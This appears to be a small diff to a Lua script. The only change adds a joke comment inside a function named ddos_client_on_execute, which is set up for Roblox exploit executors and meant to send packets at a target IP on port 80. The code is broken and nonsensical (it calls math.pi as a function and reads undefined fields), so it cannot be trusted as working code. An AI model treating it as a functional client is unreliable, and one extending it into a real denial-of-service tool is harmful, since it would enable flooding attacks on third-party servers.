@@ -26,6 +26,7 @@ function load(...)
 end
 
 function ddos_client_on_execute(isSynapse, isProto, isSentinel, isSirhurt, ...)
+    --bruh
     local args = {...}
     if isSynapse then
       args.sendpacket.to(args.getip, math.pi(10000*10000), 80)
